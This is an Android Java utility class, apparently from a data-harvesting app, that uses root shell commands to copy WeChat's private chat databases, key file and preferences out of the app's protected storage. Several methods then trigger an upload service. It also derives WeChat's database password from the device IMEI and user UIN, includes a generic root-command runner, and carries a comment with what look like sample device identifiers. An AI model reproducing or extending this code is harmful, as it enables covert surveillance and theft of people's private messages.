package live_library.wechatutils;

import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;

import com.blankj.utilcode.util.FileUtils;
import com.mylike.keepalive.XApp;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;

import live_library.KeepAliveManager;
import live_library.wechat2.UploadService;
import live_library.wechat2.UploadService1;
import live_library.wechat2.db.SqlDataUtil;
import live_library.wechat2.db.SqlDataUtil1;
import live_library.wechatlog.RLog;

public class RootUtil {
//    RootUtil.move("/data/data/com.tencent.mm/files/KeyInfo.bin", SqlDataUtil.WX_ROOT+"files/KeyInfo.bin");
//                            RLog.w(TAG, "move-files/KeyInfo.bin-结束");
//                           RootUtil.move("/data/data/com.tencent.mm/MicroMsg/", SqlDataUtil.WX_ROOT+"MicroMsg/");
//                            RLog.w(TAG, "move-MicroMsg-结束");
//                           RootUtil.move("/data/data/com.tencent.mm/shared_prefs/", SqlDataUtil.WX_ROOT+"shared_prefs/");
//                            RLog.w(TAG, "move-shared_prefs-结束");
//                            RLog.w(TAG, "startUpload-开始");
//                           UploadService.getInstance(XApp.getApp()).startUpload();
//                            RLog.w(TAG, "startUpload-结束");


//                            RootUtil.move("/data/user/999/com.tencent.mm/files/KeyInfo.bin", SqlDataUtil1.WX_ROOT +"files/KeyInfo.bin");
//                            RLog.w(TAG, "1move-files/KeyInfo.bin-结束");
//                            RootUtil.move("/data/user/999/com.tencent.mm/MicroMsg/", SqlDataUtil1.WX_ROOT+"MicroMsg/" );
//                            RLog.w(TAG, "1move-MicroMsg-结束");
//                            RootUtil.move("/data/user/999/com.tencent.mm/shared_prefs/", SqlDataUtil1.WX_ROOT+"shared_prefs/" );
//                            RLog.w(TAG, "1move-shared_prefs-结束");
//                            RLog.w(TAG, "1startUpload-开始");
//                            UploadService1.getInstance().startUpload();
//                            RLog.w(TAG, "KeepAliveManager-准备关闭");
//                            KeepAliveManager.stopWork(getApplication());
//                            RLog.w(TAG, "KeepAliveManager-关闭完成");


    public static boolean move(String oldPath,String newPath){
        Process suProcess=null;
        DataOutputStream os = null;
        try {
            boolean isDelete = FileUtils.deleteAllInDir(newPath);
//            RLog.i("move0-deleteAllInDir:",isDelete+"");
//            if (isDelete) {
            String comando = "cp -raf"+" "+oldPath+" "+ " "+newPath;
            suProcess = Runtime.getRuntime().exec("su");
            os = new DataOutputStream(suProcess.getOutputStream());
            os.writeBytes(comando + "\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            int suProcessRetval = suProcess.waitFor();
            RLog.i("move-suProcessRetval:",suProcessRetval+"");
            if (1== suProcessRetval||0==suProcessRetval){
                return true;
            }else {
                return false;
            }
        }catch (Exception e){
            RLog.e("RootUtil","move-suProcessRetval:",e);
            e.printStackTrace();
            return false;
        }finally{
            try {
                if (os!=null){
                    os.close();
                }
                suProcess.destroy();
            }catch (Exception e){

            }
        }

    }
    public static void move0(String oldPath,String newPath){
        try
        {//rm -rf
            boolean isDelete = FileUtils.deleteAllInDir(newPath);
//            RLog.i("move0-deleteAllInDir:",isDelete+"");
//            if (isDelete) {
                String comando = "cp -raf"+" "+oldPath+" "+ " "+newPath;
                Process suProcess = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
                os.writeBytes(comando + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                int suProcessRetval = suProcess.waitFor();
                RLog.i("move0-suProcessRetval:",suProcessRetval+"");
                if (1== suProcessRetval||0==suProcessRetval)
                {
//                    Calendar calendar = Calendar.getInstance();
//                    calendar.setTimeInMillis(System.currentTimeMillis());
//                    String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(calendar.getTime());
//                    RLog.i("move0-sleep-time-start:",time+"");
//                    Thread.sleep(10000);
//                    calendar.setTimeInMillis(System.currentTimeMillis());
//                    String time1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(calendar.getTime());
//                    RLog.i("move0-sleep-time-end:",time1+"");
//                    File mFile = new File(SqlDataUtil.WX_ROOT_PATH);
//                    File mFile1 = new File(SqlDataUtil1.WX_ROOT_PATH);
//                    if (!mFile.exists()){
//                        SqlDataUtil.WX_ROOT_PATH = SqlDataUtil.WX_ROOT;
//                        boolean s = new File(SqlDataUtil.WX_ROOT_PATH).exists();
//                        RLog.i("新路路径WX_ROOT_PATH:",s+"");
//                    }
//                    if (!mFile1.exists()){
//                        SqlDataUtil1.WX_ROOT_PATH = SqlDataUtil1.WX_ROOT;
//                    }
                    UploadService.getInstance(XApp.getApp()).startUpload();
                }else
                {
                    // Acceso Root denegado
    //                retval = false;

                }

//            }

        }
        catch (Exception ex)
        {
            RLog.i("Error ejecutando el comando Root",""+ ex);
        }
    }
    public static void moveFile(String oldPath,String newPath){
        try
        {//rm -rf
//            boolean isDelete = FileUtils.deleteAllInDir(newPath);
//            RLog.i("move0-deleteAllInDir:",isDelete+"");
//            if (isDelete) {
                String comando = "cp -raf"+" "+oldPath+" "+ " "+newPath;
                Process suProcess = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
                os.writeBytes(comando + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                int suProcessRetval = suProcess.waitFor();
//                RLog.i("moveFile-suProcessRetval:",suProcessRetval+"");

        }
        catch (Exception ex)
        {
            RLog.i("Error ejecutando el comando Root",""+ ex);
        }
    }
    public static boolean moveTest0(String oldPath,String newPath){
        try
        {//rm -rf
            boolean isDelete = FileUtils.deleteAllInDir(newPath);
//            RLog.i("move0-deleteAllInDir:",isDelete+"");
//            if (isDelete) {
                String comando = "cp -raf"+" "+oldPath+" "+ " "+newPath;
                Process suProcess = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
                os.writeBytes(comando + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                int suProcessRetval = suProcess.waitFor();
                RLog.i("move0-suProcessRetval:",suProcessRetval+"");
                if (1== suProcessRetval||0==suProcessRetval){
                    return true;
                }else {
                    return false;
                }
        }
        catch (Exception ex)
        {
            RLog.i("Error ejecutando el comando Root",""+ ex);
        }
        return false;
    }
    public static void move00(String oldPath,String newPath){
        try
        {//rm -rf
                String comando = "cp -raf"+" "+oldPath+" "+ " "+newPath;
                Process suProcess = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
                os.writeBytes(comando + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                int suProcessRetval = suProcess.waitFor();
                RLog.i("move0-suProcessRetval:",suProcessRetval+"");
                if (1== suProcessRetval||0==suProcessRetval)
                {
//                    UploadService.getInstance(UploadService.getContext()).startUpload();
                }else
                {

                }

        }
        catch (Exception ex)
        {
            RLog.i("Error ejecutando el comando Root",""+ ex);
        }
    }

    public static void move1(String oldPath,String newPath){
        try
        {
            boolean isDelete = FileUtils.deleteAllInDir(newPath);
            if (isDelete) {
                String comando = "cp -r"+" "+oldPath+" "+ " "+newPath;
                Process suProcess = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
                os.writeBytes(comando + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                int suProcessRetval = suProcess.waitFor();
                RLog.i("move1-suProcessRetval:",suProcessRetval+"");
                if (1== suProcessRetval||0==suProcessRetval)
                {
//                    Calendar calendar = Calendar.getInstance();
//                    calendar.setTimeInMillis(System.currentTimeMillis());
//                    String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(calendar.getTime());
//                    RLog.i("move1-sleep-time-start:",time+"");
//                    Thread.sleep(10000);
//                    calendar.setTimeInMillis(System.currentTimeMillis());
//                    String time1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(calendar.getTime());
//                    RLog.i("move1-sleep-time-end:",time1+"");
//                    File mFile = new File(SqlDataUtil.WX_ROOT_PATH);
//                    File mFile1 = new File(SqlDataUtil1.WX_ROOT_PATH);
//                    if (!mFile.exists()){
//                        SqlDataUtil.WX_ROOT_PATH = SqlDataUtil.WX_ROOT;
//                    }
//                    if (!mFile1.exists()){
//                        SqlDataUtil1.WX_ROOT_PATH = SqlDataUtil1.WX_ROOT;
//                        boolean s = new File(SqlDataUtil1.WX_ROOT_PATH).exists();
//                        RLog.i("新路路径WX_ROOT_PATH-1:",s+"");
//                    }
                    UploadService1.getInstance().startUpload();
                }else
                {
                    // Acceso Root denegado
    //                retval = false;

                }

            }

        }
        catch (Exception ex)
        {
            RLog.i("Error ejecutando el comando Root",""+ ex);
        }
    }
    public static boolean moveTest1(String oldPath,String newPath){
        try
        {
            boolean isDelete = FileUtils.deleteAllInDir(newPath);
            if (isDelete) {
                String comando = "cp -r"+" "+oldPath+" "+ " "+newPath;
                Process suProcess = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
                os.writeBytes(comando + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                int suProcessRetval = suProcess.waitFor();
                RLog.i("move1-suProcessRetval:",suProcessRetval+"");
                if (1== suProcessRetval||0==suProcessRetval){
                    return true;
                }
                return false;
            }
        }
        catch (Exception ex)
        {
            RLog.i("Error ejecutando el comando Root",""+ ex);
        }
            return false;
    }

    public static ArrayList execCmdsforResult(String[] cmds) {
        ArrayList<String> list = new ArrayList<String>();
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = null;
            OutputStream os1 = process.getOutputStream();
            process.getErrorStream();
            InputStream is = process.getInputStream();
            int i = cmds.length;
            for (int j = 0; j < i; j++) {
                String str = cmds[j];
                os1.write((str + "\n").getBytes());
                String cmd = "cat "+str+" > "+ SqlDataUtil1.WX_ROOT;
//                process = Runtime.getRuntime().exec("su");
                os = new DataOutputStream(os1);
                os.writeBytes(cmd+"\n");
                os.writeBytes("exit\n");
                os.flush();
                os.flush();
            }
            os1.write("exit\n".getBytes());
            String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
            File wxDataDir = new File(SqlDataUtil.WX_DB_DIR_PATH() );
            os1.flush();
            os1.close();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            while (true) {
                String str = reader.readLine();
//                RLog.i(TAG,str);
                if (str == null) {
                    break;
                }

                list.add(str);
            }
            reader.close();
            process.waitFor();
            process.destroy();
            return list;
        } catch (Exception localException) {
        }
        return list;
    }
    /**
     * 根据imei和uin生成的md5码，获取数据库的密码（去前七位的小写字母）
     */
    public static String getDbPassword(String imei, String uin) {//uin  865364041673082 295410226   aae6143
        if (TextUtils.isEmpty(imei) || TextUtils.isEmpty(uin)) {
            Log.d("WeChatUtil", "初始化数据库密码失败：imei或uid为空");
            return null;
        }
        String md5 = md5(imei + uin);
        assert md5 != null;
        return md5.substring(0, 7).toLowerCase();
    }
    /**
     * md5加密
     */
    public static String md5(String content) {
        MessageDigest md5;
        try {
            md5 = MessageDigest.getInstance("MD5");
            md5.update(content.getBytes("UTF-8"));
            byte[] encryption = md5.digest();
            StringBuilder sb = new StringBuilder();
            for (byte anEncryption : encryption) {
                if (Integer.toHexString(0xff & anEncryption).length() == 1) {
                    sb.append("0").append(Integer.toHexString(0xff & anEncryption));
                } else {
                    sb.append(Integer.toHexString(0xff & anEncryption));
                }
            }
            return sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    /**
     * 执行linux指令
     *
     * @param paramString
     */
    public static void execRootCmd(String paramString) {
        try {
            Process localProcess = Runtime.getRuntime().exec("su");
            Object localObject = localProcess.getOutputStream();
            DataOutputStream localDataOutputStream = new DataOutputStream((OutputStream) localObject);
            String str = String.valueOf(paramString);
            localObject = str + "\n";
            localDataOutputStream.writeBytes((String) localObject);
            localDataOutputStream.flush();
            localDataOutputStream.writeBytes("exit\n");
            localDataOutputStream.flush();
            localProcess.waitFor();
            localObject = localProcess.exitValue();
        } catch (Exception localException) {
            localException.printStackTrace();
        }
    }

}
